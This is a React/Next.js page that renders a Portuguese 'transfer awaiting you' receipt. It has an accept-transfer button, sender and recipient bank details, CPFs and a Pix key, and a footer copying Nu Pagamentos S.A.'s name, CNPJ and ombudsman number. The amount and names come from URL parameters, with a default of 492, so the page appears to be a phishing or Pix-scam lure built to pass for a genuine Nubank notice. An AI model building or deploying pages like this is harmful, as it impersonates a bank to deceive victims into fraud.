import { Card } from '../../components/ui/card'
import { AcceptTransferButton } from '@/components/AcceptTransferButton'
import {
  generateMetadataHelper,
  GenerateMetadataProps,
  getFirstName,
  getTransactionProps,
} from '@/helpers'
import { formatToBRL } from '@/helpers/formatToBRL'
import { fetchTransaction } from '@/helpers/fetchTransaction'

export async function generateMetadata({ searchParams, params }: GenerateMetadataProps) {
  return generateMetadataHelper({ searchParams, params })
}

type TransactionPageProps = { searchParams: Record<string, string> }

export default async function TransactionPage({ searchParams }: TransactionPageProps) {
  const hash = (await searchParams.hash) || null
  const data = await fetchTransaction(hash)
  if (hash && !data) {
    return (
      <div className="flex justify-center items-center min-h-screen text-red-600">
        Comprovante não encontrado
      </div>
    )
  }
  const props = getTransactionProps(data, searchParams)
  const formattedAmount = formatToBRL(Number(props.valor) || 492)
  const destinoFirstName = getFirstName(props.destinoNome).toUpperCase()
  const firstName = getFirstName(props.origemNome).toUpperCase()

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-white p-4">
      <div className="w-full max-w-lg">
        <div className="flex flex-col items-center mb-4">
          <img
            src="/flight-money.png"
            alt="Comprovante de transferência"
            className="w-24 h-24 mb-4 object-contain"
          />
          <h1 className="text-2xl font-bold text-center mb-2">
            {firstName} quer realizar uma transferência para você
          </h1>
        </div>
        <TransactionTicket
          formattedAmount={formattedAmount}
          destinoFirstName={destinoFirstName}
          horario={props.horario}
          payload={props}
        />
        <TransactionDetails
          {...props}
          pixKey={props.pixKey}
        />
      </div>
      <TransactionFooter transacaoId={props.transacaoId} />
    </div>
  )
}

function TransactionTicket({
  formattedAmount,
  destinoFirstName,
  horario,
  payload,
}: {
  formattedAmount: string
  destinoFirstName: string
  horario: string
  payload: Record<string, any>
}) {
  return (
    <div className="relative my-4 flex justify-center overflow-hidden">
      <div className="absolute left-0 top-1/2 translate-y-5 -translate-x-1/2 w-6 h-6 bg-white rounded-full border border-gray-200 z-10"></div>
      <div className="absolute right-0 top-1/2 translate-y-5 translate-x-1/2 w-6 h-6 bg-white rounded-full border border-gray-200 z-10"></div>
      <div className="border border-gray-200 rounded-lg w-full max-w-lg bg-white shadow-sm overflow-hidden">
        <div className="p-6 flex flex-col items-center pb-2">
          <span className="text-3xl font-bold text-gray-900 mb-2">{formattedAmount}</span>
          <span className="text-lg text-gray-700 mb-1">para {destinoFirstName}</span>
          <span className="text-sm text-gray-400 mb-2">{horario}</span>
        </div>
        <div className="w-full border-t border-dashed border-gray-300"></div>
        <div className="p-4 px-6 flex flex-col items-center">
          <AcceptTransferButton />
        </div>
      </div>
    </div>
  )
}

function TransactionDetails(props: Record<string, any> & { pixKey: string }) {
  return (
    <>
      <Card className="mb-4 p-4">
        <div className="flex items-center mb-2">
          <img
            src="/send-money.png"
            alt="Ícone de envio de dinheiro"
            className="w-5 h-5 mr-2"
          />
          <span className="font-semibold">Origem</span>
        </div>
        <div className="text-sm text-gray-700 grid grid-cols-2 gap-y-2 gap-x-4">
          <span className="font-medium">Nome</span>
          <span>{props.origemNome}</span>
          <span className="font-medium">Instituição</span>
          <span>{props.origemInstituicao}</span>
          <span className="font-medium">Agência</span>
          <span>{props.origemAgencia}</span>
          <span className="font-medium">Conta</span>
          <span>{props.origemConta}</span>
          <span className="font-medium">CPF</span>
          <span>{props.origemCpf}</span>
        </div>
      </Card>
      <Card className="mb-4 p-4">
        <div className="flex items-center mb-2">
          <img
            src="/send-money.png"
            alt="Ícone de recebimento de dinheiro"
            className="w-5 h-5 mr-2 rotate-180"
          />
          <span className="font-semibold">Destino</span>
        </div>
        <div className="text-sm text-gray-700 grid grid-cols-2 gap-y-2 gap-x-4">
          <span className="font-medium">Nome</span>
          <span>{props.destinoNome}</span>
          <span className="font-medium">Instituição</span>
          <span>{props.destinoInstituicao}</span>
          <span className="font-medium">Agência</span>
          <span>{props.destinoAgencia}</span>
          <span className="font-medium">Conta</span>
          <span>{props.destinoConta}</span>
          <span className="font-medium">CPF</span>
          <span>{props.destinoCpf}</span>
          <span className="font-medium">Chave pix</span>
          <span>{props.pixKey}</span>
        </div>
      </Card>
    </>
  )
}

function TransactionFooter({ transacaoId }: { transacaoId: string }) {
  return (
    <div className="w-full max-w-lg mx-auto mt-8 text-xs text-gray-800 mb-24">
      <div className="mb-1 font-semibold">Nu Pagamentos S.A. - Instituição de Pagamento</div>
      <div className="mb-2">CNPJ 18.236.120/0001-58</div>
      <div className="mb-1 font-semibold">ID da transação: {transacaoId}</div>
      <div className="mb-0.5">Estamos aqui para ajudar se você tiver alguma dúvida</div>
      <div>
        Ouvidoria: 0800 887 0463, atendimento em dias úteis, das 09h às 18h (horário de São Paulo).
      </div>
    </div>
  )
}
